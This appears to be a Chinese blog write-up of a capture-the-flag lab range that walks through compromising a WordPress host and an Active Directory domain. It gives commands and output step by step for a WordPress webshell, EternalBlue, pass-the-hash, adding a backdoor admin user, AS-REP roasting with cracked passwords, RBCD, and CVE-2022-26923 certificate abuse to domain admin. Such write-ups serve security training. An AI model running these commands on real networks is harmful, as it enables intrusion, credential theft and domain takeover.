+++
date = '2026-03-10T10:00:00+08:00'
lastmod = '2026-03-10T11:00:00+08:00'
draft = false
title = '春秋云境 - 2022网鼎杯半决赛复盘 WriteUP'
categories = ['WriteUP', '春秋云境']
tags = ['WriteUP', '春秋云境']

+++

## flag 1

拿到 IP，先用 fscan 扫描一下。  

```plaintext
D:\CTFTools\Software\Web\fscan>fscan.exe -h 39.99.158.212 -o reports/1.txt

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.158.212:22 open
39.99.158.212:80 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://39.99.158.212        code:200 len:39936  title:XIAORANG.LAB
```

![](../assets/屏幕截图%202025-03-27%20143402.png)

发现是一个 wordpress，我们用 wpscan 去扫描一下看看是什么漏洞。  

```plaintext
D:\CTFTools\Software\Web\dirsearch-0.4.3\dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: D:\CTFTools\Software\Web\dirsearch-0.4.3\reports\http_39.99.158.212\__25-03-27_14-37-34.txt

Target: http://39.99.158.212/

[14:37:34] Starting:
[14:37:40] 403 -  276B  - /.ht_wsr.txt
[14:37:40] 403 -  276B  - /.htaccess.bak1
[14:37:40] 403 -  276B  - /.htaccess.save
[14:37:40] 403 -  276B  - /.htaccess.sample
[14:37:40] 403 -  276B  - /.htaccess.orig
[14:37:40] 403 -  276B  - /.htaccess_sc
[14:37:40] 403 -  276B  - /.htaccess_extra
[14:37:40] 403 -  276B  - /.htaccessBAK
[14:37:40] 403 -  276B  - /.htaccess_orig
[14:37:40] 403 -  276B  - /.htaccessOLD2
[14:37:40] 403 -  276B  - /.html
[14:37:40] 403 -  276B  - /.htaccessOLD
[14:37:40] 403 -  276B  - /.htm
[14:37:40] 403 -  276B  - /.htpasswd_test
[14:37:40] 403 -  276B  - /.htpasswds
[14:37:40] 403 -  276B  - /.httr-oauth
[14:37:42] 403 -  276B  - /.php
[14:38:27] 301 -    0B  - /index.php  ->  http://39.99.158.212/
[14:38:27] 404 -   35KB - /index.php/login/
[14:38:31] 200 -    7KB - /license.txt
[14:38:48] 200 -    3KB - /readme.html
[14:38:51] 403 -  276B  - /server-status/
[14:38:51] 403 -  276B  - /server-status
[14:39:08] 301 -  313B  - /wp-admin  ->  http://39.99.158.212/wp-admin/
[14:39:08] 302 -    0B  - /wp-admin/  ->  http://39.99.158.212/wp-login.php?redirect_to=http%3A%2F%2F39.99.158.212%2Fwp-admin%2F&reauth=1
[14:39:08] 409 -    3KB - /wp-admin/setup-config.php
[14:39:08] 200 -  511B  - /wp-admin/install.php
[14:39:08] 200 -    0B  - /wp-config.php
[14:39:08] 400 -    1B  - /wp-admin/admin-ajax.php
[14:39:08] 200 -    0B  - /wp-content/
[14:39:08] 301 -  315B  - /wp-content  ->  http://39.99.158.212/wp-content/
[14:39:09] 200 -   84B  - /wp-content/plugins/akismet/akismet.php
[14:39:09] 500 -    0B  - /wp-content/plugins/hello.php
[14:39:09] 200 -  415B  - /wp-content/upgrade/
[14:39:09] 200 -  477B  - /wp-content/uploads/
[14:39:09] 200 -    0B  - /wp-cron.php
[14:39:09] 200 -    0B  - /wp-includes/rss-functions.php
[14:39:09] 200 -    5KB - /wp-includes/
[14:39:09] 301 -  316B  - /wp-includes  ->  http://39.99.158.212/wp-includes/
[14:39:09] 200 -    2KB - /wp-login.php
[14:39:09] 302 -    0B  - /wp-signup.php  ->  http://39.99.158.212/wp-login.php?action=register
[14:39:10] 405 -   42B  - /xmlrpc.php
```

我们发现 wordpress 存在插件 `akismet`，那么我们尝试去网上获取他的 PoC，看看能不能进行利用，测试发现这个插件的漏洞对我们来说没什么用。  
我们尝试了一下，发现弱口令 `admin/123456` 可以直接登录后台。  

![](../assets/屏幕截图%202025-03-27%20144947.png)

我们直接编辑 plugins，进行写马，访问 `/wp-content/plugins/akismet/akismet.php` 即可连接木马，从而 RCE。  

![](../assets/屏幕截图%202025-03-27%20145319.png)

我们连接直接在根目录下看到 flag01。  

```plaintext
 ________ ___       ________  ________  ________    _____     
|\  _____\\  \     |\   __  \|\   ____\|\   __  \  / __  \    
\ \  \__/\ \  \    \ \  \|\  \ \  \___|\ \  \|\  \|\/_|\  \   
 \ \   __\\ \  \    \ \   __  \ \  \  __\ \  \\\  \|/ \ \  \  
  \ \  \_| \ \  \____\ \  \ \  \ \  \|\  \ \  \\\  \   \ \  \ 
   \ \__\   \ \_______\ \__\ \__\ \_______\ \_______\   \ \__\
    \|__|    \|_______|\|__|\|__|\|_______|\|_______|    \|__|


	flag01: flag{a1c9f11e-1033-4f2a-95f0-032f1ff79d22}

```

## flag 2

先进行一波信息收集，获取该机器在内网中的 IP。  

```plaintext
www-data@ubuntu-web:/tmp$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.15.26  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe27:638  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:27:06:38  txqueuelen 1000  (Ethernet)
        RX packets 469488  bytes 181314930 (181.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 381112  bytes 46433896 (46.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2002  bytes 177327 (177.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2002  bytes 177327 (177.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

然后上传 fscan 进行内网的扫描，扫描结果如下。  

```plaintext
www-data@ubuntu-web:/tmp$ ./fs -h 172.22.15.26/24 -o res_15.txt
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-27 15:00:50] [INFO] 暴力破解线程数: 1
[2025-03-27 15:00:50] [INFO] 开始信息扫描
[2025-03-27 15:00:50] [INFO] CIDR范围: 172.22.15.0-172.22.15.255
[2025-03-27 15:00:51] [INFO] 生成IP范围: 172.22.15.0.%!d(string=172.22.15.255) - %!s(MISSING).%!d(MISSING)
[2025-03-27 15:00:51] [INFO] 解析CIDR 172.22.15.26/24 -> IP范围 172.22.15.0-172.22.15.255
[2025-03-27 15:00:51] [INFO] 最终有效主机数量: 256
[2025-03-27 15:00:51] [INFO] 开始主机扫描
[2025-03-27 15:00:51] [INFO] 正在尝试无监听ICMP探测...
[2025-03-27 15:00:51] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-03-27 15:00:51] [INFO] 切换为PING方式探测...
[2025-03-27 15:00:51] [SUCCESS] 目标 172.22.15.13    存活 (ICMP)
[2025-03-27 15:00:51] [SUCCESS] 目标 172.22.15.24    存活 (ICMP)
[2025-03-27 15:00:51] [SUCCESS] 目标 172.22.15.26    存活 (ICMP)
[2025-03-27 15:00:51] [SUCCESS] 目标 172.22.15.35    存活 (ICMP)
[2025-03-27 15:00:51] [SUCCESS] 目标 172.22.15.18    存活 (ICMP)
[2025-03-27 15:00:57] [INFO] 存活主机数量: 5
[2025-03-27 15:00:57] [INFO] 有效端口数量: 233
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.26:80
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.24:80
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.13:88
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.13:135
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.24:135
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.18:139
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.35:139
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.24:139
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.18:135
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.13:139
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.35:135
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.13:389
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.18:80
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.13:445
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.24:445
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.35:445
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.26:22
[2025-03-27 15:00:57] [SUCCESS] 端口开放 172.22.15.18:445
[2025-03-27 15:00:58] [SUCCESS] 服务识别 172.22.15.26:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
[2025-03-27 15:01:02] [SUCCESS] 服务识别 172.22.15.26:80 => [http]
[2025-03-27 15:01:02] [SUCCESS] 服务识别 172.22.15.13:88 => 
[2025-03-27 15:01:02] [SUCCESS] 服务识别 172.22.15.18:139 =>  Banner:[.]
[2025-03-27 15:01:02] [SUCCESS] 服务识别 172.22.15.35:139 =>  Banner:[.]
[2025-03-27 15:01:02] [SUCCESS] 服务识别 172.22.15.24:80 => [http]
[2025-03-27 15:01:02] [SUCCESS] 服务识别 172.22.15.24:139 =>  Banner:[.]
[2025-03-27 15:01:02] [SUCCESS] 服务识别 172.22.15.13:139 =>  Banner:[.]
[2025-03-27 15:01:03] [SUCCESS] 服务识别 172.22.15.13:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
[2025-03-27 15:01:03] [SUCCESS] 服务识别 172.22.15.13:445 => 
[2025-03-27 15:01:03] [SUCCESS] 服务识别 172.22.15.24:445 => 
[2025-03-27 15:01:03] [SUCCESS] 服务识别 172.22.15.35:445 => 
[2025-03-27 15:01:03] [SUCCESS] 服务识别 172.22.15.18:80 => [http]
[2025-03-27 15:01:03] [SUCCESS] 服务识别 172.22.15.18:445 => 
[2025-03-27 15:01:03] [SUCCESS] 端口开放 172.22.15.24:3306
[2025-03-27 15:01:08] [SUCCESS] 服务识别 172.22.15.24:3306 => [mysql] 版本:5.7.26 产品:MySQL Banner:[J.5.7.26.phY B;h.+ [Ss2xC>T]Z mysql_native_password]
[2025-03-27 15:02:02] [SUCCESS] 服务识别 172.22.15.13:135 => 
[2025-03-27 15:02:02] [SUCCESS] 服务识别 172.22.15.24:135 => 
[2025-03-27 15:02:02] [SUCCESS] 服务识别 172.22.15.18:135 => 
[2025-03-27 15:02:03] [SUCCESS] 服务识别 172.22.15.35:135 => 
[2025-03-27 15:02:03] [INFO] 存活端口数量: 19
[2025-03-27 15:02:03] [INFO] 开始漏洞扫描
[2025-03-27 15:02:03] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
[2025-03-27 15:02:03] [SUCCESS] 网站标题 http://172.22.15.24       状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.15.24/www
[2025-03-27 15:02:03] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.15.35
主机名: XR-0687
发现的网络接口:
   IPv4地址:
      └─ 172.22.15.35
[2025-03-27 15:02:03] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.15.18
主机名: XR-CA
发现的网络接口:
   IPv4地址:
      └─ 172.22.15.18
[2025-03-27 15:02:03] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.15.24
主机名: XR-WIN08
发现的网络接口:
   IPv4地址:
      └─ 172.22.15.24
[2025-03-27 15:02:03] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.15.13
主机名: XR-DC01
发现的网络接口:
   IPv4地址:
      └─ 172.22.15.13
[2025-03-27 15:02:03] [SUCCESS] 网站标题 http://172.22.15.18       状态码:200 长度:703    标题:IIS Windows Server
[2025-03-27 15:02:03] [SUCCESS] NetBios 172.22.15.35    XIAORANG\XR-0687              
[2025-03-27 15:02:03] [SUCCESS] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393
[2025-03-27 15:02:03] [SUCCESS] 发现漏洞 172.22.15.24 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010
[2025-03-27 15:02:03] [SUCCESS] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[2025-03-27 15:02:03] [INFO] 系统信息 172.22.15.13 [Windows Server 2016 Standard 14393]
[2025-03-27 15:02:03] [SUCCESS] NetBios 172.22.15.13    DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393
[2025-03-27 15:02:03] [SUCCESS] 网站标题 http://172.22.15.26       状态码:200 长度:39962  标题:XIAORANG.LAB
[2025-03-27 15:02:03] [SUCCESS] 目标: http://172.22.15.18:80
  漏洞类型: poc-yaml-active-directory-certsrv-detect
  漏洞名称: 
  详细信息:
        author:AgeloVito
        links:https://www.cnblogs.com/EasonJim/p/6859345.html
[2025-03-27 15:02:03] [SUCCESS] 网站标题 http://172.22.15.24/www/sys/index.php 状态码:200 长度:135    标题:无标题
[2025-03-27 15:02:27] [SUCCESS] 扫描已完成: 35/35
```

首先，我们发现 `172.22.15.24` 存在 MS17-010 漏洞，那么我们用 msf 去进行攻击即可。  

```bash
proxychains4 msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
set RHOSTS 172.22.15.24
exploit
```

尝试发现，msf 的 shell 有点问题，但是可以直接读文件，先把 flag02 给读出来吧。

```bash
cd C:/Users/Administrator/flag
ls
cat flag02.txt
```

那么 flag02 如下。  

```plaintext
  __ _              ___  __
 / _| |            / _ \/_ |
| |_| | __ _  __ _| | | || |
|  _| |/ _` |/ _` | | | || |
| | | | (_| | (_| | |_| || |
|_| |_|\__,_|\__, |\___/ |_|
              __/ |
             |___/


flag02: flag{2e191985-3660-4b3a-b1c5-01be8b41c15e}
```

## flag 3

由于上一 flag 的地方，我们 msf 的 shell 出了点问题，不能拿到 shell，现在我们要想办法解决这个问题。  

我们可以用哈希传递登录，去获取 shell。   

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e52d03e9b939997401466a0ec5a9cbc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

然后我们用 psexec 去连接。  

```bash
proxychains4 python3 psexec.py administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbk
```

然后去添加一个我们自己的用户，然后进行进一步的操作。  

```cmd
net user gwht qwer1234! /add
net localgroup administrators gwht /add
```

不知道为什么连接的时候出现报错，后来看别人的 WP 发现是 Windows 自动更新，加了一些傻逼限制导致连接失败了。  

![](../assets/屏幕截图%202025-03-27%20165208.png)

在 Windows 家庭版下缺少 CredSSP 注册表，接下来就手动添加注册表：  
 1. 新建 txt 文档，命名为“CredSSPfix.txt”；  
 2. 打开文档，保存以下内容；  

```plaintext
 Windows Registry Editor Version 5.00
 
 [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters]
 "AllowEncryptionOracle"=dword:00000002
```

 3. 修改文件后缀为 `.reg`，运行该文件添加注册表，双击运行即可。  
 之后就可以 rdp 连接上了，其中我们发现系统中有 phpStudy，可以去看看有没有敏感的配置信息，做一波信息收集。  

![](../assets/屏幕截图%202025-03-27%20214934.png)

再根据上面的扫描结果，发现这台机子存在 MySQL 的服务，我们可以查看 phpStudy 的配置文件去获取登录数据库的用户名和密码为 `root/root@#123`。  

![](../assets/屏幕截图%202025-03-27%20215356.png)

在数据库中，找到了以下的一些信息，可能在之后的渗透中有用。  

![](../assets/屏幕截图%202025-03-27%20221530.png)

我们在看到 `http://172.22.15.24/www/sys/index.php`，发现这台机器还有个平台可以弱口令登录（其实没必要，因为数据库中就可以拿到用户名和密码等数据了），获取到用户名和密码。  

然后，我们写一个脚本来从导出的数据中提取出相关的用户名数据。  

```python
import csv


def extract_csv(csv_file_path, txt_file_path):
    try:
        with open(csv_file_path, 'r', newline='', encoding='utf-8') as csvfile:
            reader = csv.DictReader(csvfile)

            with open(txt_file_path, 'w', encoding='utf-8') as txtfile:
                for row in reader:
                    txtfile.write(row['account'] + '\n')

        print("数据已成功保存到", txt_file_path)
    except FileNotFoundError:
        print("错误：未找到指定的 CSV 文件。")
    except IndexError:
        print("错误：指定的行号超出了 CSV 文件的范围。")
    except Exception as e:
        print(f"发生未知错误：{e}")


if __name__ == "__main__":
    csv_file = 'zdoosys_user.csv'
    txt_file = 'user.txt'
    extract_csv(csv_file, txt_file)
```

接着我们去看一下是否存在有不要求 Kerberos 预身份验证的账户。

```bash
proxychains4 impacket-GetNPUsers -dc-ip 172.22.15.13 xiaorang.lab/ -usersfile user.txt
```

我们找到两个账户的信息，拿到 hashcat 去爆破。

```plaintext
$krb5asrep$23$lixiuying@XIAORANG.LAB:6b295c54594c96228ad0a52244cc2400$3b5154a029fcd2145b9dc401393d8cdb53184edfc52dab03c80eb211406ef10365e8170d5552c3f49ad358dd5d3289cd0da3bd353b0e5a7155cb6849cc4a4ffd56fb7b0f23c9dce1e158d1e6d77b30c50386303e26f3f2e337021f98734e7d251d578f2952def8ebfb3f07395fb90856517b0f45c653f72f4908cdad8ef56879e8f418555dccfab858ab0cf0cb36b703219382bf5b98d8f5318b701eacf4418fd46ea0372d412a2a514f298a4e7a85ed05c4991f4bc35c221de2664671a3e9c08b2575de1c4ec699f2c811b8e376ba49aa53f19beb3990e463397fdc93b009b9adbef00ba250d0e692bd1706
$krb5asrep$23$huachunmei@XIAORANG.LAB:e395f78671b806b54ce976bd0e45cac0$b2d56a586fd934e7cb8360865769ecd0453016a7b22631bc9ce9e769ceb58f37b638bc092fc55e3d7edb54d4f036e7f3b162a7d7a3694e0a302d66b022003e061967aecf77949423d2ffc8d8cb1281147c73e2cd8677d9f2a6129cafd522d7d60966a74e90f4f4fc5a10e68687a10648a88fb6f4fdecbcaba6a128713283442b201e82daa11308ba8b2028cbcb0b2d62ee7a418565ffc5a2fc5abf4adb5564e93e2465d4de034604ebbe53c4a27b3540fc095fb8867caf2874f12bb579fad097b8c0f6a7aaed931f61513cb87782d23ebed143137c5e278967c5893ffc3af43a8bdc24ee5da347c147d8763d
```

爆破。

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt --show
```

爆破结果如下。

```plaintext
$krb5asrep$23$lixiuying@XIAORANG.LAB:6b295c54594c96228ad0a52244cc2400$3b5154a029fcd2145b9dc401393d8cdb53184edfc52dab03c80eb211406ef10365e8170d5552c3f49ad358dd5d3289cd0da3bd353b0e5a7155cb6849cc4a4ffd56fb7b0f23c9dce1e158d1e6d77b30c50386303e26f3f2e337021f98734e7d251d578f2952def8ebfb3f07395fb90856517b0f45c653f72f4908cdad8ef56879e8f418555dccfab858ab0cf0cb36b703219382bf5b98d8f5318b701eacf4418fd46ea0372d412a2a514f298a4e7a85ed05c4991f4bc35c221de2664671a3e9c08b2575de1c4ec699f2c811b8e376ba49aa53f19beb3990e463397fdc93b009b9adbef00ba250d0e692bd1706:winniethepooh
$krb5asrep$23$huachunmei@XIAORANG.LAB:e395f78671b806b54ce976bd0e45cac0$b2d56a586fd934e7cb8360865769ecd0453016a7b22631bc9ce9e769ceb58f37b638bc092fc55e3d7edb54d4f036e7f3b162a7d7a3694e0a302d66b022003e061967aecf77949423d2ffc8d8cb1281147c73e2cd8677d9f2a6129cafd522d7d60966a74e90f4f4fc5a10e68687a10648a88fb6f4fdecbcaba6a128713283442b201e82daa11308ba8b2028cbcb0b2d62ee7a418565ffc5a2fc5abf4adb5564e93e2465d4de034604ebbe53c4a27b3540fc095fb8867caf2874f12bb579fad097b8c0f6a7aaed931f61513cb87782d23ebed143137c5e278967c5893ffc3af43a8bdc24ee5da347c147d8763d:1qaz2wsx
```

整理可得。

```plaintext
xiaorang.lab\lixiuying:winniethepooh
xiaorang.lab\huachunmei:1qaz2wsx
```

我们用 RDP 远程登录 `172.22.15.35`，发现 `xiaorang.lab\lixiuying:winniethepooh` 这个账户是可以登录的，接下来我们准备横向移动。

由于我们现在已经登录到 DC 服务器中，我们先用 bloodhound 收集一波信息。

```bash
proxychains4 bloodhound-python -c all -u lixiuying -p winniethepooh -d xiaorang.lab -ns 172.22.15.13 --zip --dns-tcp
```

> [!tips]
> 导入数据后，要重新打开 BloodHound 才能看到节点正常显示

![](../assets/82096b5f97aa20bbf2f53c5783a7f27b.png)

我们知道 `LIXIUYING@XIAORANG.LAB` 对 `XR-0687.XIAORANG.LAB` 具有 GenericWrite 权限，我们就可以打 RBCD。

资源基约束委派攻击 (RBCD) ，GenericWrite 权限允许你修改目标计算机对象的属性。

- 原理： 你可以修改目标主机的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。

- 后果： 攻击者可以配置一个自己控制的伪造服务账号，使其拥有对目标主机的委派权限。通过申请 Kerberos 服务票据（ST），攻击者可以伪造成任何用户（包括 Domain Admin）访问目标主机。

- 最终结果： 获得目标主机的 SYSTEM 权限。

首先，我们要添加一个机器账户，用来去修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，以及满足 S4U2self 流程。

```bash
proxychains4 impacket-addcomputer -method SAMR xiaorang.lab/lixiuying:winniethepooh -computer-name test$ -computer-pass 'qwe123!@#' -dc-ip 172.22.15.13
```

### 导入 Powershell 脚本的攻击方式

[tools/PowerView.ps1](https://github.com/shigophilo/tools/blob/master/PowerView.ps1)

执行下面的命令，拿到机器账户的 SID。

```cmd
Import-Module .\PowerView.ps1  
Get-NetComputer test -Properties objectsid
```

或者可以再用 BloodHound 收集一次信息，我们就可以拿到 `test.xiaorang.lab` 用户的 SID 值了。

![](../assets/99de0186-6e33-4da5-bd16-b962b8661aaf.png)

```plaintext
S-1-5-21-3745972894-1678056601-2622918667-1147
```

然后我们去修改服务资源的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。

```cmd
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3745972894-1678056601-2622918667-1147)";$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer XR-0687 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

> 它的目的是：告诉域控，**“我允许刚才创建的那个恶意机器账户（test$）代表任何人来访问我（XR-0687）”**

### 直接用 impacket 工具包攻击

首先，我们要在 `/etc/hosts` 添加目标 IP 指向的域名。

```plaintext
172.22.15.35 XR-0687.xiaorang.lab
```

然后我们直接使用工具。

```bash
proxychains4 impacket-rbcd xiaorang.lab/lixiuying:'winniethepooh' -dc-ip 172.22.15.13 -action write -delegate-to 'XR-0687$' -delegate-from 'test$'
```

![](../assets/7d8f6749-f1b2-4c24-b65c-88f651f576ce.png)

然后我们通过 S4U2self 去请求 Administrator 的票据，我们利用 `getST.py` 来执行此操作。这一步会模拟 `test$` 代表 `Administrator` 向 DC 申请访问权限。

```bash
proxychains4 impacket-getST -dc-ip 172.22.15.13 -spn cifs/XR-0687.xiaorang.lab 'xiaorang.lab/test$:qwe123!@#' -impersonate Administrator
```

![](../assets/edcbbf83-b44f-4425-8bf1-4926feebbdc0.png)

然后，我们要将票据导入到内存中，方便后续工具调用它。

```bash
export KRB5CCNAME=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache
```

最后，我们用 psexec 和目标主机获取交互式 Shell 即可。

```bash
proxychains4 impacket-psexec -k -no-pass Administrator@XR-0687.xiaorang.lab -dc-ip 172.22.15.13
```

获取到 flag03。

```plaintext
  __ _            __ ____
 / _| |__ _ __ _ /  \__ /
|  _| / _` / _` | () |_ \
|_| |_\__,_\__, |\__/___/
           |___/

flag03: flag{57670c9d-f2ed-4445-9262-3479de531169}
```

## flag 4

根据之前的扫描结果，还有个 18 的靶机存在漏洞，可以进行攻击。

```plaintext
[2025-03-27 15:02:03] [SUCCESS] 目标: http://172.22.15.18:80
  漏洞类型: poc-yaml-active-directory-certsrv-detect
  漏洞名称: 
  详细信息:
        author:AgeloVito
        links:https://www.cnblogs.com/EasonJim/p/6859345.html
```

意思是这个 `172.22.15.18` 存在 Active Directory 证书服务，我们经过搜索可以得知，这可以打 [CVE-2022-26923](https://www.freebuf.com/vuls/335471.html) Windows域提权。

> [!info]
> 当 Windows 系统的 Active Directory 证书服务（CS）在域上运行时，由于机器账号中的 dNSHostName 属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从 Active Directory 证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限

我们首先需要安装 [Certipy](https://github.com/ly4k/Certipy/) 这个工具。

然后，创建一个机器用户将该机器用户 dNSHostName 属性指向域控。

```bash
proxychains4 certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user 'test2$' -pass 'qwe123!@#' -dns 'XR-DC01.xiaorang.lab'
```

![](../assets/d8a4e658-a84e-4f93-9d99-38449609105d.png)

我们先用工具探测一下域内 CA 的信息，主要是要获取它的 CA Name。

```bash
proxychains4 certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -stdout
```

成功写入后，就向 AD CS 申请域控的证书，这个要打两次，第一次没打通。

```bash
proxychains4 certipy-ad req -u 'test2$@xiaorang.lab' -p 'qwe123!@#' -ca 'xiaorang-XR-CA-CA' -target 172.22.15.18 -template 'Machine'
```

![](../assets/82dc1ac8-06ea-436c-b9a0-82b9f71b6b3d.png)

接下来要使用工具 [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)，但是，我们要先用 certipy 从 pfx 证书中分离出 key 和 crt。

```bash
certipy-ad cert -pfx xr-dc01.pfx -nokey -out user.crt
certipy-ad cert -pfx xr-dc01.pfx -nocert -out user.key
```

然后上脚本。

```bash
proxychains4 python3 passthecert.py -action whoami -crt /home/lucifer/user.crt -key /home/lucifer/user.key -domain xiaorang.lab -dc-ip 172.22.15.13
```

![](../assets/0209ce42-d3fa-494f-b92f-b6e574dfc59f.png)

将证书配置到域控的 RBCD。

```bash
proxychains4 python3 passthecert.py -action write_rbcd -crt /home/lucifer/user.crt -key /home/lucifer/user.key -domain xiaorang.lab -dc-ip 172.22.15.13 -delegate-to 'XR-DC01$' -delegate-from 'test2$'
```

![](../assets/1549ad50-befe-4f79-ab3e-133219409393.png)

然后用这个去申请票据即可。

```bash
proxychains4 impacket-getST -dc-ip 172.22.15.13 -spn cifs/XR-DC01.xiaorang.lab 'xiaorang.lab/test2$:qwe123!@#' -impersonate Administrator
```

配置票据还要配置 hosts。

```bash
export KRB5CCNAME=Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache
```

我们再去获取交互式 Shell 即可。

```bash
proxychains4 impacket-psexec -k -no-pass Administrator@XR-DC01.xiaorang.lab -dc-ip 172.22.15.13
```

拿到 flag04。

```plaintext
 :::===== :::      :::====  :::=====  :::====  :::  ===
 :::      :::      :::  === :::       :::  === :::  ===
 ======   ===      ======== === ===== ===  === ========
 ===      ===      ===  === ===   === ===  ===      ===
 ===      ======== ===  ===  =======   ======       ===


flag04: flag{bf857a6f-3fa7-401d-a7d4-4a48a68b8fff}
```

